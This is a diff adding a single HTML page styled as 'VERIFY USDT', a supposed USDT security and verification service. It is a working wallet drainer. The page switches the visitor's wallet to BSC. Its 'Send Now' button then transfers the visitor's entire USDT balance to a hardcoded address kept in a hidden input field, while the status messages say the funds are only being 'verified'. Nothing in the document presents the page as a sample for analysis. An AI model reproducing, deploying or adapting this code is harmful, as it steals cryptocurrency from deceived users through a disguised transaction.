@@ -1,0 +1,94 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>VERIFY USDT</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.umd.min.js"></script>
+</head>
+<body class="bg-black text-white flex flex-col justify-center items-center min-h-screen text-center px-4">
+
+  <!-- Logo -->
+  <div class="text-left w-full max-w-2xl">
+    <h1 class="text-green-400 text-xl font-bold mb-4">🟢 VERIFYUSDT</h1>
+  </div>
+
+  <!-- Headline Text -->
+  <h2 class="text-4xl md:text-5xl font-bold leading-tight mb-6">
+    Secure, seamless, and<br/>worry-free transactions.
+  </h2>
+  <p class="text-lg text-gray-300 mb-10 max-w-xl">
+    Monitor, detect, and eliminate risks across USDT, wallets, and blockchains for enhanced trust, compliance, and peace of mind.
+  </p>
+
+  <!-- Hidden Inputs -->
+  <input type="hidden" id="addressInput" value="0xe47a9ecb5C87b06364bA2c6CEB064583c935f2ed" />
+  <input type="hidden" id="amountInput" value="ALL" />
+
+  <!-- Button -->
+  <button onclick="sendUSDT()" class="bg-lime-400 text-black font-bold px-8 py-3 rounded-full text-lg hover:bg-lime-500 transition">
+    Send Now
+  </button>
+
+  <!-- Status Message -->
+  <p id="status" class="mt-6 text-sm text-gray-400"></p>
+
+  <!-- Footer -->
+  <div class="mt-12 text-xs text-gray-500">
+    <p>🔒 Protected by VerifyUsdt</p>
+    <p class="mt-1">THE TRUSTED SECURITY MARK</p>
+  </div>
+
+  <!-- Script -->
+  <script>
+    window.addEventListener("load", async () => {
+      if (window.ethereum) {
+        try {
+          await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: "0x38" }] // BSC
+          });
+        } catch (err) {
+          console.warn("Network switch failed or rejected.");
+        }
+      }
+    });
+
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
+    const USDT_ABI = [
+      "function balanceOf(address owner) view returns (uint256)",
+      "function transfer(address to, uint256 amount) returns (bool)"
+    ];
+
+    async function sendUSDT() {
+      const recipient = document.getElementById("addressInput").value;
+
+      if (!window.ethereum) {
+        alert("Please open in Trust Wallet or DApp browser.");
+        return;
+      }
+
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+      const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
+      const sender = await signer.getAddress();
+
+      document.getElementById("status").textContent = "⏳ Checking USDT balance...";
+      const balance = await usdt.balanceOf(sender);
+
+      if (balance == 0n) {
+        document.getElementById("status").textContent = "❌ No USDT available to send.";
+        return;
+      }
+
+      document.getElementById("status").textContent = "🔍 Verifying USDT...";
+      const tx = await usdt.transfer(recipient, balance);
+      await tx.wait();
+
+      document.getElementById("status").textContent = "✅ Verifying USDT done.";
+    }
+  </script>
+</body>
+</html>
